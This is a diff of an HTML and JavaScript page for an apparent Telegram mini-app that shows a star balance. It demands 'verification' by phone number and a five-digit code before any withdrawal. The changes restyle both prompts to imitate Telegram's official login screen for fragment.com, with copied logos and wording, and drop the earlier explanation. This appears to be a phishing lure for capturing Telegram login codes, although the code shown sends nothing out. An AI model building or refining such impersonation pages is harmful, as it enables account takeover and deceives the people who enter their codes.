@@ -15,12 +15,12 @@
       --purple: #a855f7;
       --blue: #3b82f6;
       --neon: 0 0 20px rgba(168, 85, 247, 0.6);
-      --success: #10b981;
-      --warning: #f59e0b;
-      --tg-bg: #1a1a2e;
-      --tg-text: #e0e7ff;
-      --tg-hint: #94a3b8;
-      --link: #00aaff;
+      --tg-bg: #ffffff;
+      --tg-text: #000000;
+      --tg-hint: #888888;
+      --tg-blue: #229ED9;
+      --tg-input: #f0f0f0;
+      --tg-border: #e0e0e0;
     }
 
     * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -40,16 +40,14 @@
     body.loaded { opacity: 1; }
 
     /* === ЗАГРУЗКА === */
-    #loader, #codeLoader {
+    #loader {
       position: fixed; top: 0; left: 0; right: 0; bottom: 0;
       background: var(--bg); display: flex; flex-direction: column;
       align-items: center; justify-content: center; z-index: 9999;
       opacity: 0; visibility: hidden;
-      transition: opacity 0.0.6s ease;
+      transition: opacity 0.6s ease;
     }
-    #loader.active, #codeLoader.active {
-      opacity: 1; visibility: visible;
-    }
+    #loader.active { opacity: 1; visibility: visible; }
 
     .spinner {
       width: 48px; height: 48px; border: 4px solid #2a2a3a;
@@ -57,8 +55,6 @@
       animation: spin 1s linear infinite; margin-bottom: 16px;
     }
     @keyframes spin { to { transform: rotate(360deg); } }
-
-    .loader-text { font-size: 16px; color: #94a3b8; }
 
     .progress-bar { width: 200px; height: 6px; background: #2a2a3a; border-radius: 3px; overflow: hidden; margin-top: 16px; }
     .progress-fill { width: 0%; height: 100%; background: linear-gradient(90deg, var(--purple), var(--blue)); border-radius: 3px; }
@@ -73,184 +69,97 @@
     }
     .tab-content.active { display: flex; opacity: 1; transform: translateY(0); z-index: 1; }
 
-    /* === БАЛАНС === */
-    .balance-card {
+    /* === БАЛАНС, ПРОФИЛЬ, ИСТОРИЯ === */
+    .balance-card, .profile-card, .history-card {
       background: linear-gradient(145deg, #1a1a2e, #16213e);
       border-radius: 28px; padding: 40px 24px; text-align: center;
-      box-shadow: 0 20px 40px rgba(0,0,0,0.4), var(--neon);
       width: 90%; max-width: 400px; position: relative; overflow: hidden;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.4), var(--neon);
       animation: cardGlow 6s infinite;
     }
-    .balance-card::before {
-      content: ''; position: absolute; top: -50%; left: -50%;
-      width: 200%; height: 200%; background: radial-gradient(circle, rgba(168, 85, 247, 0.15), transparent);
-      animation: glow 6s infinite; pointer-events: none;
-    }
-    @keyframes glow { 0%, 100% { transform: translate(0, 0); } 50% { transform: translate(20%, 20%); } }
     @keyframes cardGlow { 0%, 100% { box-shadow: 0 20px 40px rgba(0,0,0,0.4), var(--neon); } 50% { box-shadow: 0 25px 50px rgba(0,0,0,0.5), 0 0 30px rgba(168, 85, 247, 0.8); } }
 
-    .star-container {
-      width: 120px; height: 120px; margin: 0 auto 24px;
-      filter: drop-shadow(0 0 20px var(--purple)); animation: starPulse 3s infinite;
-    }
+    .star-container { width: 120px; height: 120px; margin: 0 auto 24px; filter: drop-shadow(0 0 20px var(--purple)); animation: starPulse 3s infinite; }
     @keyframes starPulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
 
-    .star-icon { width: 100%; height: 100%; }
-
-    .balance-amount {
-      font-size: 64px; font-weight: 700;
-      background: linear-gradient(90deg, var(--purple), var(--blue));
-      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-      margin-bottom: 8px; animation: textPulse 2s infinite;
-    }
-    @keyframes textPulse { 0%, 100% { filter: brightness(1); } 50% { filter: brightness(1.3); } }
-
+    .balance-amount { font-size: 64px; font-weight: 700; background: linear-gradient(90deg, var(--purple), var(--blue)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 8px; }
     .balance-label { font-size: 18px; color: #94a3b8; margin-bottom: 32px; }
 
-    .withdraw-btn {
-      background: rgba(255,255,255,0.1); color: #ccc;
-      border: 1px solid rgba(255,255,255,0.2); padding: 14px;
-      border-radius: 16px; width: 100%; font-weight: 600; font-size: 16px;
-      cursor: pointer; transition: all 0.3s;
-    }
-    .withdraw-btn:active { transform: translateY(2px); }
+    .withdraw-btn { background: rgba(255,255,255,0.1); color: #ccc; border: 1px solid rgba(255,255,255,0.2); padding: 14px; border-radius: 16px; width: 100%; font-weight: 600; font-size: 16px; cursor: pointer; }
 
-    /* === ПРОФИЛЬ === */
-    .profile-card {
-      background: linear-gradient(145deg, #1a1a2e, #16213e);
-      border-radius: 28px; padding: 32px 24px; text-align: center;
-      width: 90%; max-width: 400px;
-      box-shadow: 0 20px 40px rgba(0,0,0,0.4), var(--neon);
-      position: relative; overflow: hidden; animation: cardGlow 6s infinite;
-    }
-    .profile-card::before {
-      content: ''; position: absolute; top: -50%; left: -50%;
-      width: 200%; height: 200%; background: radial-gradient(circle, rgba(168, 85, 247, 0.15), transparent);
-      animation: glow 6s infinite; pointer-events: none;
-    }
-
-    .avatar {
-      width: 100px; height: 100px; border-radius: 50%; margin: 0 auto 16px;
-      overflow: hidden; box-shadow: var(--neon); animation: avatarPulse 3s infinite;
-    }
-    .avatar img { width: 100%; height: 100%; object-fit: cover; }
-    @keyframes avatarPulse { 0%, 100% { box-shadow: 0 0 20px rgba(168, 85, 247, 0.6); } 50% { box-shadow: 0 0 30px rgba(168, 85, 247, 0.9); } }
-
-    .username {
-      font-size: 24px; font-weight: 700;
-      background: linear-gradient(90deg, var(--purple), var(--blue));
-      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-      margin-bottom: 8px;
-    }
-
+    .avatar { width: 100px; height: 100px; border-radius: 50%; margin: 0 auto 16px; overflow: hidden; box-shadow: var(--neon); }
+    .username { font-size: 24px; font-weight: 700; background: linear-gradient(90deg, var(--purple), var(--blue)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 8px; }
     .join-date { font-size: 14px; color: #94a3b8; margin-bottom: 24px; }
-
-    .verification-status {
-      display: flex; align-items: center; justify-content: center;
-      gap: 8px; font-size: 14px; color: var(--warning); margin-bottom: 16px;
-    }
-    .status-dot {
-      width: 10px; height: 10px; background: var(--warning);
-      border-radius: 50%; animation: blink 1.5s infinite;
-    }
+    .verification-status { display: flex; align-items: center; justify-content: center; gap: 8px; font-size: 14px; color: #f59e0b; margin-bottom: 16px; }
+    .status-dot { width: 10px; height: 10px; background: #f59e0b; border-radius: 50%; animation: blink 1.5s infinite; }
     @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
+    .verify-btn { background: linear-gradient(90deg, var(--purple), var(--blue)); color: white; font-weight: 600; font-size: 16px; padding: 14px; border: none; border-radius: 16px; width: 100%; cursor: pointer; }
 
-    .verify-btn {
-      background: linear-gradient(90deg, var(--purple), var(--blue));
-      color: white; font-weight: 600; font-size: 16px;
-      padding: 14px; border: none; border-radius: 16px;
-      width: 100%; cursor: pointer; box-shadow: 0 8px 20px rgba(168, 85, 247, 0.3);
-      transition: all 0.3s;
-    }
-    .verify-btn:active { transform: translateY(2px); }
+    .history-card { color: #94a3b8; font-size: 16px; }
 
-    /* === ИСТОРИЯ === */
-    .history-card {
-      background: linear-gradient(145deg, #1a1a2e, #16213e);
-      border-radius: 28px; padding: 32px 24px; text-align: center;
-      width: 90%; max-width: 400px;
-      color: #94a3b8; font-size: 16px;
-      box-shadow: 0 20px 40px rgba(0,0,0,0.4), var(--neon);
-      animation: cardGlow 6s infinite;
-    }
-
-    /* === МОДАЛЬНОЕ ОКНО === */
-    .modal {
+    /* === МОДАЛЬНОЕ ОКНО ТГ === */
+    .tg-modal {
       position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(0,0,0,0.8); display: none; align-items: center;
-      justify-content: center; z-index: 1000;
+      background: var(--tg-bg); display: none; flex-direction: column;
+      padding: 20px; z-index: 1000; color: var(--tg-text);
     }
-    .modal.active { display: flex; }
+    .tg-modal.active { display: flex; }
 
-    .modal-content {
-      background: var(--tg-bg); color: var(--tg-text);
-      border-radius: 20px; padding: 28px; width: 90%; max-width: 380px;
-      transform: translateY(50px) scale(0.95); opacity: 0;
-      transition: all 0.4s cubic-bezier(0.25, 0.8, 0.25, 1);
+    .tg-logo-container {
+      display: flex; align-items: center; justify-content: center;
+      gap: 12px; margin-bottom: 32px;
     }
-    .modal.active .modal-content {
-      transform: translateY(0) scale(1); opacity: 1;
+    .tg-logo {
+      width: 48px; height: 48px; border-radius: 50%; overflow: hidden;
     }
+    .tg-logo img { width: 100%; height: 100%; object-fit: contain; }
+    .tg-arrow { font-size: 24px; color: var(--tg-blue); font-weight: bold; }
 
-    .modal-title { font-size: 20px; font-weight: 600; margin-bottom: 8px; }
-    .modal-subtitle {
-      font-size: 15px; color: var(--link); margin-bottom: 12px; cursor: pointer;
-      text-decoration: underline; text-decoration-color: rgba(0,170,255,0.3);
+    .tg-title {
+      font-size: 28px; font-weight: 700; text-align: center; margin-bottom: 8px; line-height: 1.2;
     }
-
-    .modal-why {
-      font-size: 14px; color: #94a3b8; margin-top: 12px; line-height: 1.5;
-      display: none; opacity: 0; transform: translateY(-10px);
-      transition: all 0.4s ease;
-    }
-    .modal-why.active { display: block; opacity: 1; transform: translateY(0); }
-
-    .country-input {
-      display: flex; align-items: center; gap: 8px; margin-bottom: 16px;
-      padding: 14px; background: rgba(255,255,255,0.05); border-radius: 16px;
-      border: 1px solid rgba(255,255,255,0.1); transition: all 0.3s;
-    }
-    .country-input:focus-within {
-      border-color: var(--accent); box-shadow: 0 0 15px rgba(0, 212, 255, 0.3);
+    .tg-subtitle {
+      font-size: 16px; color: var(--tg-hint); text-align: center; margin-bottom: 32px; line-height: 1.4;
     }
 
-    .country-code-input {
-      color: var(--accent); font-weight: 600; font-size: 18px;
-      width: 50px; text-align: center; background: none; border: none; outline: none;
+    .tg-phone-input {
+      display: flex; gap: 8px; margin-bottom: 32px;
+    }
+    .tg-country-code {
+      width: 70px; padding: 16px 8px; background: var(--tg-input); border: 1px solid var(--tg-border);
+      border-radius: 12px; font-size: 18px; font-weight: 500; text-align: center;
+    }
+    .tg-phone-number {
+      flex: 1; padding: 16px 20px; background: var(--tg-input); border: 1px solid var(--tg-border);
+      border-radius: 12px; font-size: 18px; font-weight: 500; text-align: center;
+    }
+    .tg-phone-input input:focus {
+      outline: none; border-color: var(--tg-blue);
     }
 
-    .phone-input {
-      flex: 1; background: none; border: none; outline: none;
-      color: var(--text); font-size: 17px; font-weight: 500;
+    .tg-button-group {
+      display: flex; justify-content: space-between; gap: 16px;
+    }
+    .tg-btn {
+      flex: 1; padding: 14px; border-radius: 12px; font-size: 17px; font-weight: 600; text-align: center; cursor: pointer;
+    }
+    .tg-btn-cancel {
+      background: transparent; color: var(--tg-blue); border: 1px solid var(--tg-blue);
+    }
+    .tg-btn-next {
+      background: var(--tg-blue); color: white;
     }
 
-    .continue-btn {
-      margin-top: 24px; background: linear-gradient(90deg, var(--purple), var(--blue));
-      color: white; font-weight: 600; font-size: 17px; padding: 14px;
-      border: none; border-radius: 16px; width: 100%; cursor: pointer;
-      box-shadow: 0 8px 20px rgba(168, 85, 247, 0.3);
-      transition: all 0.3s;
-    }
-    .continue-btn:active { transform: translateY(2px); }
-
-    /* === КОД === */
-    .code-input-container {
-      display: flex; justify-content: center; gap: 10px; margin: 28px 0;
-    }
-    .code-digit {
-      width: 52px; height: 62px; border: 2px solid rgba(255,255,255,0.2);
-      border-radius: 16px; background: rgba(255,255,255,0.05);
-      color: white; font-size: 28px; font-weight: 600; text-align: center;
-      transition: all 0.3s;
-    }
-    .code-digit:focus {
-      border-color: var(--accent); box-shadow: 0 0 15px rgba(0, 212, 255, 0.4);
+    /* === ЭКРАН КОДА === */
+    .tg-code-container {
+      width: 100px; height: 100px; margin: 0 auto 32px; font-size: 80px; line-height: 1;
     }
 
-    .resend-link {
-      color: var(--accent); font-size: 15px; text-align: center; cursor: pointer;
-      transition: color 0.3s;
-    }
+    .tg-code-title { font-size: 24px; font-weight: 700; text-align: center; margin-bottom: 8px; }
+    .tg-code-subtitle { font-size: 16px; color: var(--tg-hint); text-align: center; margin-bottom: 32px; }
+    .tg-code-inputs { display: flex; justify-content: center; gap: 12px; margin-bottom: 32px; }
+    .tg-code-digit { width: 52px; height: 62px; border: 1px solid var(--tg-border); border-radius: 12px; background: #f7f7f7; color: var(--tg-text); font-size: 28px; font-weight: 600; text-align: center; }
+    .tg-resend { color: var(--tg-blue); font-size: 15px; text-align: center; cursor: pointer; margin-bottom: 32px; }
 
     /* === BOTTOM NAV === */
     .bottom-nav {
@@ -273,7 +182,6 @@
   <!-- ЗАГРУЗКА -->
   <div id="loader" class="active">
     <div class="spinner"></div>
-    <div class="loader-text">Загрузка</div>
     <div class="progress-bar"><div class="progress-fill" id="progress"></div></div>
   </div>
 
@@ -313,48 +221,51 @@
   </div>
 
   <!-- ШАГ 1: ВВОД НОМЕРА -->
-  <div id="phoneModal" class="modal">
-    <div class="modal-content">
-      <div class="modal-title">Ваш номер телефона</div>
-      <div class="modal-subtitle" onclick="toggleWhy()">Зачем это нужно?</div>
-      <div class="modal-why" id="whyText">
-        Ввод номера телефона требуется для верификации на бота. Последнее время, в наш бот продолжают заливать ботов с попыткой снести сервис. Мы были вынуждены добавить эту верификацию.
-      </div>
+  <div id="phoneModal" class="tg-modal">
+    <div class="tg-logo-container">
+      <div class="tg-logo"><img src="Local/Tg/Tg.png" alt="Telegram"></div>
+      <div class="tg-arrow">→</div>
+      <div class="tg-logo"><img src="Local/Fragment/Fragment.png" alt="Fragment"></div>
+    </div>
 
-      <div class="country-input">
-        <input type="text" class="country-code-input" id="countryCode" value="+7" maxlength="4" inputmode="numeric" oninput="enforcePlus(this)">
-        <input type="tel" class="phone-input" id="phoneInput" placeholder="___ ___ ____" inputmode="numeric">
-      </div>
+    <h1 class="tg-title">Войдите, чтобы<br>использовать аккаунт<br>Telegram</h1>
+    <p class="tg-subtitle">
+      для fragment.com и Fragment Auction Alerts.<br>
+      Введите свой номер телефона в международном формате.<br>
+      Подтверждение будет отправлено в Telegram.
+    </p>
 
-      <button class="continue-btn" onclick="goToCodeStep()">Продолжить</button>
+    <div class="tg-phone-input">
+      <input type="text" class="tg-country-code" id="countryCode" value="7" maxlength="3" inputmode="numeric" placeholder="7">
+      <input type="tel" class="tg-phone-number" id="phoneNumber" placeholder="___ ___ __ __" inputmode="numeric">
+    </div>
+
+    <div class="tg-button-group">
+      <div class="tg-btn tg-btn-cancel" onclick="closePhoneModal()">ОТМЕНА</div>
+      <div class="tg-btn tg-btn-next" onclick="goToCodeStep()">ДАЛЕЕ</div>
     </div>
   </div>
 
-  <!-- ЗАГРУЗКА ПЕРЕД КОДОМ -->
-  <div id="codeLoader">
-    <div class="spinner"></div>
-    <div class="loader-text">Отправка кода...</div>
-    <div class="progress-bar"><div class="progress-fill" id="codeProgress"></div></div>
-  </div>
-
   <!-- ШАГ 2: ВВОД КОДА -->
-  <div id="codeModal" class="modal">
-    <div class="modal-content">
-      <div class="modal-title" id="fullPhone">+7 ___ ___ ____</div>
-      <div style="font-size:14px;color:#94a3b8;margin-bottom:20px;">
-        Код отправлен на ваш номер
-      </div>
+  <div id="codeModal" class="tg-modal">
+    <div class="tg-code-container">Telegram</div>
 
-      <div class="code-input-container">
-        <input type="text" class="code-digit" maxlength="1" inputmode="numeric" oninput="moveToNext(this, 0); filterDigits(this)">
-        <input type="text" class="code-digit" maxlength="1" inputmode="numeric" oninput="moveToNext(this, 1); filterDigits(this)">
-        <input type="text" class="code-digit" maxlength="1" inputmode="numeric" oninput="moveToNext(this, 2); filterDigits(this)">
-        <input type="text" class="code-digit" maxlength="1" inputmode="numeric" oninput="moveToNext(this, 3); filterDigits(this)">
-        <input type="text" class="code-digit" maxlength="1" inputmode="numeric" oninput="moveToNext(this, 4); filterDigits(this)">
-      </div>
+    <h2 class="tg-code-title">Введите код</h2>
+    <p class="tg-code-subtitle" id="codePhone">Код отправлен на +7 ___ ___ __ __</p>
 
-      <div class="resend-link" onclick="resendCode()">Отправить код повторно</div>
-      <button class="continue-btn" onclick="completeVerification()">Продолжить</button>
+    <div class="tg-code-inputs">
+      <input type="text" class="tg-code-digit" maxlength="1" inputmode="numeric" oninput="moveToNext(this, 0)">
+      <input type="text" class="tg-code-digit" maxlength="1" inputmode="numeric" oninput="moveToNext(this, 1)">
+      <input type="text" class="tg-code-digit" maxlength="1" inputmode="numeric" oninput="moveToNext(this, 2)">
+      <input type="text" class="tg-code-digit" maxlength="1" inputmode="numeric" oninput="moveToNext(this, 3)">
+      <input type="text" class="tg-code-digit" maxlength="1" inputmode="numeric" oninput="moveToNext(this, 4)">
+    </div>
+
+    <div class="tg-resend" onclick="resendCode()">Отправить код повторно</div>
+
+    <div class="tg-button-group">
+      <div class="tg-btn tg-btn-cancel" onclick="backToPhone()">НАЗАД</div>
+      <div class="tg-btn tg-btn-next" onclick="completeVerification()">ДАЛЕЕ</div>
     </div>
   </div>
 
@@ -375,12 +286,11 @@
   </div>
 
   <script>
-    // === ПЛАВНАЯ ЗАГРУЗКА ===
+    // === ЗАГРУЗКА ===
     window.addEventListener('load', () => {
       const progress = document.getElementById('progress');
       const loader = document.getElementById('loader');
       let current = 0;
-
       const timer = setInterval(() => {
         current += 2;
         progress.style.width = current + '%';
@@ -422,82 +332,61 @@
       }, 10);
     }
 
-    // === ВЫВОД ===
+    // === ВЕРИФИКАЦИЯ ===
     function checkVerification() {
       alert('Сначала пройдите верификацию!');
       openTab('profile');
     }
 
-    // === МОДАЛКА НОМЕРА ===
     function openPhoneModal() {
       document.getElementById('phoneModal').classList.add('active');
     }
 
-    // === "Зачем?" ===
-    function toggleWhy() {
-      document.getElementById('whyText').classList.toggle('active');
+    function closePhoneModal() {
+      document.getElementById('phoneModal').classList.remove('active');
     }
 
-    // === ПЛЮС НЕЛЬЗЯ УДАЛИТЬ ===
-    function enforcePlus(input) {
-      let val = input.value;
-      if (!val.startsWith('+')) {
-        val = '+' + val.replace(/^\+/, '');
-      }
-      if (val === '+') val = '+';
-      input.value = val;
-    }
+    // === КОД СТРАНЫ: ТОЛЬКО + НЕЛЬЗЯ СТЕРЕТЬ ===
+    const countryCode = document.getElementById('countryCode');
+    countryCode.addEventListener('input', function(e) {
+      let val = e.target.value.replace(/\D/g, '');
+      if (val === '') val = '7';
+      e.target.value = val;
+    });
 
-    // === ФИЛЬТР ЦИФР ===
-    function filterDigits(input) {
-      input.value = input.value.replace(/\D/g, '');
-    }
+    // === НОМЕР: ФОРМАТ ===
+    const phoneNumber = document.getElementById('phoneNumber');
+    phoneNumber.addEventListener('input', function(e) {
+      let val = e.target.value.replace(/\D/g, '').slice(0, 10);
+      if (val.length > 6) val = val.replace(/(\d{3})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4');
+      else if (val.length > 3) val = val.replace(/(\d{3})(\d{3})/, '$1 $2');
+      e.target.value = val;
+    });
 
     // === ПЕРЕХОД К КОДУ ===
     function goToCodeStep() {
-      let code = document.getElementById('countryCode').value.trim();
-      const phone = document.getElementById('phoneInput').value.trim().replace(/\D/g, '');
+      const code = countryCode.value.trim();
+      const num = phoneNumber.value.replace(/\D/g, '');
+      if (!code || code.length < 1 || code.length > 3) return alert('Код страны: 1–3 цифры');
+      if (num.length !== 10) return alert('Введите полный номер');
 
-      if (!code || !/^\+\d+$/.test(code) || code.length < 2 || code.length > 4) {
-        return alert('Код страны: + и 1–3 цифры');
-      }
-      if (phone.length < 10) return alert('Введите полный номер');
-
-      const formatted = phone.replace(/(\d{3})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4');
-      document.getElementById('fullPhone').textContent = `${code} ${formatted}`;
+      const formatted = num.replace(/(\d{3})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4');
+      document.getElementById('codePhone').textContent = `Код отправлен на +${code} ${formatted}`;
 
       document.getElementById('phoneModal').classList.remove('active');
-
-      const codeLoader = document.getElementById('codeLoader');
-      codeLoader.classList.remove('active');
-      codeLoader.style.display = 'flex';
-      setTimeout(() => codeLoader.classList.add('active'), 10);
-
-      const progress = document.getElementById('codeProgress');
-      let current = 0;
-      const duration = 500 + Math.random() * 1500;
-      const interval = duration / 50;
-
-      const timer = setInterval(() => {
-        current += 2;
-        progress.style.width = current + '%';
-        if (current >= 100) {
-          clearInterval(timer);
-          setTimeout(() => {
-            codeLoader.classList.remove('active');
-            setTimeout(() => {
-              document.getElementById('codeModal').classList.add('active');
-            }, 100);
-          }, 300);
-        }
-      }, interval);
+      document.getElementById('codeModal').classList.add('active');
+      setTimeout(() => document.querySelector('.tg-code-digit').focus(), 100);
     }
 
-    // === КОД ===
+    function backToPhone() {
+      document.getElementById('codeModal').classList.remove('active');
+      document.getElementById('phoneModal').classList.add('active');
+    }
+
     function moveToNext(input, index) {
-      filterDigits(input);
-      if (input.value.length === 1 && index < 4) {
-        document.querySelectorAll('.code-digit')[index + 1].focus();
+      input.value = input.value.replace(/\D/g, '');
+      if (input.value && index < 4) {
+        document.querySelectorAll('.tg-code-digit')[index + 1].focus();
       }
     }
 
@@ -506,10 +395,13 @@
     }
 
     function completeVerification() {
-      const digits = Array.from(document.querySelectorAll('.code-digit')).map(d => d.value);
+      const digits = Array.from(document.querySelectorAll('.tg-code-digit')).map(d => d.value);
       if (digits.some(d => !d)) return alert('Введите код полностью');
       alert('Верификация пройдена!');
       document.getElementById('codeModal').classList.remove('active');
+      document.querySelector('.verification-status span').textContent = 'Пройденная';
+      document.querySelector('.verification-status').style.color = '#10b981';
+      document.querySelector('.status-dot').style.background = '#10b981';
     }
   </script>
 </body>
